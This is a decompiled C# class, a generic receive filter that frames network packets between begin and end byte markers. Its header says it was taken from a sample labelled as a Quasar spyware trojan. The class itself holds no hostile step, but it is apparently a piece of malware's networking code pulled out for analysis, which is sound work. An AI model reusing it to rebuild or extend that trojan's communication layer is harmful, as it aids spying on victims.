// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.BeginEndMarkReceiveFilter`1
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public abstract class BeginEndMarkReceiveFilter<TPackageInfo> : 
    IReceiveFilter<TPackageInfo>,
    IPackageResolver<TPackageInfo>
    where TPackageInfo : IPackageInfo
  {
    private readonly SearchMarkState<byte> m_BeginSearchState;
    private readonly SearchMarkState<byte> m_EndSearchState;
    private bool m_FoundBegin;

    public BeginEndMarkReceiveFilter(byte[] beginMark, byte[] endMark)
    {
      this.m_BeginSearchState = new SearchMarkState<byte>(beginMark);
      this.m_EndSearchState = new SearchMarkState<byte>(endMark);
    }

    private bool CheckChanged(byte[] oldMark, byte[] newMark)
    {
      if (oldMark.Length != newMark.Length)
        return true;
      for (int index = 0; index < oldMark.Length; ++index)
      {
        if ((int) oldMark[index] != (int) newMark[index])
          return true;
      }
      return false;
    }

    public void ChangeBeginMark(byte[] beginMark)
    {
      if (!this.CheckChanged(this.m_BeginSearchState.Mark, beginMark))
        return;
      this.m_BeginSearchState.Change(beginMark);
    }

    public void ChangeEndMark(byte[] endMark)
    {
      if (!this.CheckChanged(this.m_EndSearchState.Mark, endMark))
        return;
      this.m_EndSearchState.Change(endMark);
    }

    public abstract TPackageInfo ResolvePackage(IBufferStream bufferStream);

    public virtual TPackageInfo Filter(BufferList data, out int rest)
    {
      rest = 0;
      ArraySegment<byte> last = data.Last;
      byte[] array = last.Array;
      int offset1 = last.Offset;
      int count = last.Count;
      int parsedLength1 = 0;
      int offset2;
      int length;
      if (!this.m_FoundBegin)
      {
        int num = ((IList<byte>) array).SearchMark<byte>(offset1, count, this.m_BeginSearchState, out parsedLength1);
        if (num < 0)
        {
          if (this.m_BeginSearchState.Matched > 0 && data.Total == this.m_BeginSearchState.Matched)
            return default (TPackageInfo);
          this.State = FilterState.Error;
          return default (TPackageInfo);
        }
        if (num != offset1)
        {
          this.State = FilterState.Error;
          return default (TPackageInfo);
        }
        this.m_FoundBegin = true;
        offset2 = offset1 + parsedLength1;
        if (offset1 + count <= offset2)
          return default (TPackageInfo);
        length = offset1 + count - offset2;
      }
      else
      {
        offset2 = offset1;
        length = count;
      }
      TPackageInfo packageInfo;
      while (true)
      {
        int parsedLength2;
        int num = ((IList<byte>) array).SearchMark<byte>(offset2, length, this.m_EndSearchState, out parsedLength2);
        if (num >= 0)
        {
          parsedLength1 += parsedLength2;
          rest = count - parsedLength1;
          if (rest > 0)
            data.SetLastItemLength(parsedLength1);
          packageInfo = this.ResolvePackage((IBufferStream) this.GetBufferStream<TPackageInfo>((IList<ArraySegment<byte>>) data));
          if ((object) packageInfo == (object) default (TPackageInfo))
          {
            if (rest > 0)
            {
              offset2 = num + this.m_EndSearchState.Mark.Length;
              length = rest;
            }
            else
              goto label_19;
          }
          else
            goto label_16;
        }
        else
          break;
      }
      return default (TPackageInfo);
label_16:
      this.Reset();
      return packageInfo;
label_19:
      return default (TPackageInfo);
    }

    public IReceiveFilter<TPackageInfo> NextReceiveFilter { get; protected set; }

    public FilterState State { get; protected set; }

    public void Reset()
    {
      this.m_BeginSearchState.Matched = 0;
      this.m_EndSearchState.Matched = 0;
      this.m_FoundBegin = false;
    }
  }
}
